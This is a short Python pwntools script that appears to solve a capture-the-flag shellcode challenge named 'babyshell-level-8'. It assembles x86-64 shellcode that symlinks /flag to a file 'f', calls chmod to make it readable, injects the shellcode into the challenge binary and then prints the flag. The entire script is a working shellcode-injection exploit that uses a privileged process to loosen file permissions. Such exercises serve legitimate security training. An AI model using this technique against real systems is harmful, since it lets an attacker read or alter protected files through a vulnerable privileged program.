import pwn
import os
pwn.context.arch='AMD64'
chall = "/challenge/babyshell-level-8"

shellcode=pwn.asm(f"""
push 0x66
mov rdi,rsp
push 4
pop rsi
push SYS_chmod
pop rax
syscall
""")

payload = shellcode
r=pwn.process(chall)
os.system("ln -s /flag f")
r.send(payload)
r.interactive()
r.clean()
os.system("cat f")